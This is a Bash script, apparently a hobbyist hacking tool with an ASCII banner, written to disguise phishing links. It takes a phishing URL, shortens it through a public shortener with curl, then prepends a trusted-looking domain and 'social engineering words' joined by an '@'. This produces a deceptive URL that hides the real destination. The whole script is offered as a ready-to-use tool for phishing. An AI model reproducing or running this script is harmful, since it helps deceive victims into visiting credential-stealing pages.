#Bash Script for Hide Phishing URL Created by WaSim Akram

url_checker() {
    if [ ! "${1//:*}" = http ]; then
        if [ ! "${1//:*}" = https ]; then
            echo -e "\e[31m[!] Invalid URL. Please use http or https.\e[0m"
            exit 1
        fi
    fi
}

echo
 red='\033[1;31m'
 rset='\033[0m'
 grn='\033[1;32m'
 ylo='\033[1;33m'
 blue='\033[1;34m'
 cyan='\033[1;36m'
 pink='\033[1;35m'
 #coding section starts :)
 clear
 echo 
 echo '
██╗  ██╗ ██████╗ ███╗   ███╗ ██████╗  ██████╗ ██████╗  █████╗ ██████╗ ██╗  ██╗
██║  ██║██╔═══██╗████╗ ████║██╔═══██╗██╔════╝ ██╔══██╗██╔══██╗██╔══██╗██║  ██║
███████║██║ver██║██╔████╔██║██║   ██║██║  ███╗██████╔╝███████║██████╔╝███████║
██╔══██║██║2.0██║██║╚██╔╝██║██║   ██║██║   ██║██╔══██╗██╔══██║██╔═══╝ ██╔══██║
██║  ██║╚██████╔╝██║ ╚═╝ ██║╚██████╔╝╚██████╔╝██║  ██║██║  ██║██║     ██║  ██║
╚═╝  ╚═╝ ╚═════╝ ╚═╝     ╚═╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝  ╚═
' |lolcat
printf "\n"
printf "                \e[101m\e[1;77m  >>  Coded BY ANON_DARKPHANTOM << \e[0m\n"
printf "\n"
printf "  \e[100m\e[1;77m >>  Youtube Channel : \e[1;96m PHANTOM TECH \e[100m\e[1;77m << \e[0m\n"
printf "\n"
echo
echo
echo -e "\e[1;31;42m ### Phishing URL ###\e[0m"
echo
echo -n "Paste Phishing URL here (with http or https): "
read phish
url_checker $phish
short=$(curl -s https://da.gd/s/?url=${phish})
shorter=${short#https://}
echo
echo -e "\e[1;31;42m ### Masking Domain ###\e[0m"
echo 'Domain to mask the Phishing URL (with http or https), ex https://google.com, http
://anything.org) :'
echo
read mask
url_checker $mask
echo
echo 'Type social engineering words:(like free-money, best-pubg-tricks)'
echo
echo -e "\e[31mDon't use space just use '-' between social engineering words\e[0m"
echo
read words
echo
echo 'Generating Homo-graph Link...'
echo
echo 'Here is the Homo-graph URL..'
echo
final=$mask-$words@$shorter
echo $final
